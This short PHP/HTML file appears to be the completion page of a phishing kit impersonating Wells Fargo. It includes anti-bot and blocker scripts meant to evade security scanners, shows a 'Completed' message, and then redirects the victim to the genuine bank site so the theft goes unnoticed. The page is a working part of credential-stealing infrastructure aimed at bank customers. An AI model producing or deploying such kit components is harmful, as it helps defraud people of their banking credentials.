<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include "./antibots.php";
include "./blocker.php";
?>
<html
<br><br><br><br><br><br><br><br>
<center><img src="blow.jpg"><br>
<h2>.....Completed.....
<meta HTTP-EQUIV="REFRESH" content="3; url=http://www.wellsfargo.com/
">